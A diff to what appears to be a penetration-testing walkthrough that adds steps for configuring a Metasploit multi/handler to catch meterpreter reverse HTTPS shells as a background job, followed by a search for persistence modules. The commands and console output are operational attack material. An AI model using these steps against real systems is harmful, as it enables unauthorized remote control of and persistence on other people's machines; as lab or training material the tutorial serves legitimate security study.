@@ -148,11 +148,8 @@ Saved as: reverse_shell
 
 ## Receiving our Callback
 
+To receive our callback we will use metasploit, to start we metasploit we run msfconsole.
 
-## Gaining Persistence
-
-We can start by searching all the metasploit modules.  To do this we will run metasploit.
-  
 ```console
 root@kali:~# msfconsole
                           ########                  #
@@ -195,7 +192,61 @@ root@kali:~# msfconsole
 msf5 > 
 ```
 
-Then we will search for persistence modules to use with the search commands.
+The module we will use is called the multi/handler.  This is a module that is used to receive any callbacks.  Then set the payload to match our payload.
+
+```console
+msf5 > use multi/handler
+msf5 exploit(multi/handler) > set payload linux/x64/meterpreter_reverse_https
+payload => linux/x64/meterpreter_reverse_https
+msf5 exploit(multi/handler) > options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (linux/x64/meterpreter_reverse_https):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The local listener hostname
+   LPORT  8443             yes       The local listener port
+   LURI                    no        The HTTP Path
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+```
+
+Then set the LHOST and LPORT.  This would normally be enought to receive the callback however in this senario we will be getting multiple callbacks.  To fix this we will need to change the advanced setting ExitOnSession to false and run the handler as a job.
+
+```console
+msf5 exploit(multi/handler) > run -j
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started HTTPS reverse handler on https://0.0.0.0:443
+msf5 exploit(multi/handler) > jobs
+
+
+Jobs
+====
+
+  Id  Name                    Payload                              Payload opts
+  --  ----                    -------                              ------------
+  0   Exploit: multi/handler  linux/x64/meterpreter_reverse_https  https://10.0.0.1:443
+```
+
+This will allow metasploit to catch meterpreter shells untill the job is killed.
+
+## Gaining Persistence
+
+We can start by searching all the metasploit modules for persistence with the search command.
 
 ```console
 msf5 > search persistence
